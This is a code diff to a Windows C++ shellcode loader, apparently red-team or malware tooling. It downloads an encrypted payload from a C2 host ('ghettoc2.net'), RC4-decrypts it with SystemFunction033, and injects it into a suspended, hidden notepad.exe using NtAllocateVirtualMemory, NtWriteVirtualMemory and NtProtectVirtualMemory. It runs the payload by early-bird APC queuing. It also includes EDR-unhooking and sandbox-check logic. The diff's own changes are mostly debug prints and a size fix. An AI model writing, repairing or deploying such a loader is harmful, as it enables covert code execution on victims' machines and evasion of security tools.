@@ -7,7 +7,7 @@
 
 #pragma comment(lib, "winhttp.lib")
 
-#define DEBUGGING 1
+// #define DEBUGGING 1
 
 #define MAXSHELLCODESIZE 4096
 
@@ -17,7 +17,6 @@
 #pragma warning (disable : 4996)
 
 using namespace std;
-
 
 // External or forward declared routines
 std::vector<BYTE> Download(LPCWSTR baseAddress, LPCWSTR filename);
@@ -124,8 +123,11 @@ BOOL checkup()
 
 }
 
+
 int main()
 {
+//	fprintf(stderr, "Start\n");
+
 	char _key[] = "advapi32.dll";
 	int i;
 
@@ -133,6 +135,9 @@ int main()
         fprintf(stderr, "Bailing out\n");
         return 0;
     }
+
+#if 0
+//	fprintf(stderr, "Unhooking\n");
 
 #ifdef DEBUGGING
 	printf("Start unhooking, press any key to continue...\n");
@@ -145,9 +150,12 @@ int main()
         return -1;
     }
 
+//	fprintf(stderr, "Unhooked\n");
+
 #ifdef DEBUGGING
     printf("Unhooked, press any key to continue...\n");
     getchar();
+#endif
 #endif
 
     _SystemFunction033 SystemFunction033 = (_SystemFunction033)GetProcAddress(LoadLibrary(L"advapi32"), "SystemFunction033");
@@ -162,7 +170,7 @@ int main()
 #endif
     std::vector<BYTE> shellcode = Download(L"ghettoc2.net\0", L"/c2/9d6cbdecabefe19dcf2e4b5469c9c5430ef450bd/tools/loader.enc\0");
 
-	int shellcode_size = (int)shellcode.size();
+	unsigned long shellcode_size = (unsigned long)(shellcode.size());
 
 #ifdef DEBUGGING
     printf("Finished download, shellcode size is %d\n", shellcode_size);
@@ -177,6 +185,8 @@ int main()
         return 0;
     }
 
+//	fprintf(stderr, "Downloaded\n");
+
     // create startup info struct
     LPSTARTUPINFOW startup_info = new STARTUPINFOW();
     startup_info->cb = sizeof(STARTUPINFOW);
@@ -189,27 +199,35 @@ int main()
     wchar_t cmd[] = L"notepad.exe\0";
 
     // create process
-    CreateProcess(
-        NULL,
-        cmd,
-        NULL,
-        NULL,
-        FALSE,
-        CREATE_NO_WINDOW | CREATE_SUSPENDED,
-        NULL,
-        NULL,
-        startup_info,
-        process_info);
+	if (!CreateProcess(
+		NULL,
+		cmd,
+		NULL,
+		NULL,
+		FALSE,
+		CREATE_NO_WINDOW | CREATE_SUSPENDED,
+		NULL,
+		NULL,
+		startup_info,
+		process_info)) {
+		// fprintf(stderr, "Error %lx creating process\n", GetLastError());
+		exit(0);
+	}
 
 #ifdef DEBUGGING
     printf("Started a suspended notepad, pid %d, check with processhacker or taskmanager and then press enter to continue...\n", GetProcessId(process_info->hProcess));
     getchar();
 #endif
 
+//	fprintf(stderr, "Started notepad, PID %d\n", GetProcessId(process_info->hProcess));
+//	getchar();
+
     // Allocate Virtual Memory
     code_size = (SIZE_T)shellcode_size;
-    ntstatus = NtAllocateVirtualMemory(process_info->hProcess, &start_address, 0, &code_size, MEM_COMMIT | MEM_RESERVE, PAGE_READWRITE);
-    if (!NT_SUCCESS(ntstatus)) {
+//	fprintf(stderr, "1.Shellcode size is %d\n", shellcode_size);
+	ntstatus = NtAllocateVirtualMemory(process_info->hProcess, &start_address, 0, &code_size, MEM_COMMIT | MEM_RESERVE, PAGE_READWRITE);
+//	fprintf(stderr, "1a.Shellcode size is %d\n", shellcode_size);
+	if (!NT_SUCCESS(ntstatus)) {
 #ifdef DEBUGGING
         fprintf(stderr, "NtAllocVirtualMemory error, ntstatus is %d\n", ntstatus);
 #endif
@@ -223,7 +241,9 @@ int main()
 #endif
     }
 
-//	fprintf(stderr, "Shellcode size is %d\n", shellcode_size);
+//	fprintf(stderr, "Allocated\n");
+
+//	fprintf(stderr, "2.Shellcode size is %d\n", shellcode_size);
 	std::copy(begin(shellcode), end(shellcode), buf);
 //	fprintf(stderr, "Oofff\n");
 
@@ -232,17 +252,29 @@ int main()
 	key.Length = sizeof(_key);
 	key.MaximumLength = sizeof(_key);
 
+//	fprintf(stderr, "3.Shellcode size is %d\n", shellcode_size);
+
 	_data.Buffer = (PUCHAR)buf;
 	//_data.Length = 0;
 	_data.Length = shellcode_size;
 	_data.MaximumLength = shellcode_size;
 
-//	fprintf(stderr, "Shellcode size is %d\n", shellcode_size);
-
-//	for (i = 0; i < shellcode_size; i++) {
-//		fprintf(stderr, "0x%02x ", buf[i]);
-//	}
-//	fprintf(stderr, "\n");
+	/*
+	fprintf(stderr, "Key structure, size %d:\n", sizeof(key));
+	struct ustring *p = &key;
+	unsigned char *c = (unsigned char *)p;
+	for (i = 0; i < sizeof(key); i++) {
+		fprintf(stderr, "0x%02x ", c[i]);
+	}
+	fprintf(stderr, "\n");
+	fprintf(stderr, "Data structure, size %d:\n",sizeof(_data));
+	p = &_data;
+	c = (unsigned char *)p;
+	for (i = 0; i < sizeof(key); i++) {
+		fprintf(stderr, "0x%02x ", c[i]);
+	}
+	fprintf(stderr, "\n");
+	*/
 
 	SystemFunction033(&_data, &key);
 
@@ -253,7 +285,10 @@ int main()
 	getchar();
 #endif
 
+	//fprintf(stderr, "Decrypted\n");
+
 	// Copy encrypted shellcode into allocated memory
+	//fprintf(stderr, "4.Shellcode size is %d\n", shellcode_size);
 	ntstatus = NtWriteVirtualMemory(process_info->hProcess, start_address, (PVOID)buf, shellcode_size, 0);
 	if (!NT_SUCCESS(ntstatus)) {
 #ifdef DEBUGGING
@@ -269,7 +304,9 @@ int main()
 #endif
 	}
 
-    ntstatus = NtProtectVirtualMemory(process_info->hProcess, &start_address, (PSIZE_T)&shellcode_size, PAGE_EXECUTE_READ, &oldProtect);
+	//fprintf(stderr, "Written, shellcode size is %d\n", shellcode_size);
+
+    ntstatus = NtProtectVirtualMemory(process_info->hProcess, &start_address, (PSIZE_T)&code_size, PAGE_EXECUTE_READ, &oldProtect);
     if (!NT_SUCCESS(ntstatus)) {
 #ifdef DEBUGGING
         fprintf(stderr, "NtProtectVirtualMemory error, ntstatus is %lx\n", ntstatus);
@@ -283,6 +320,9 @@ int main()
         getchar();
 #endif
     }
+
+	fprintf(stderr, "Memory protected, check with processhacker\n");
+	getchar();
 
     ntstatus = NtQueueApcThread(process_info->hThread, PKNORMAL_ROUTINE(start_address), start_address, NULL, NULL);
     if (!NT_SUCCESS(ntstatus)) {
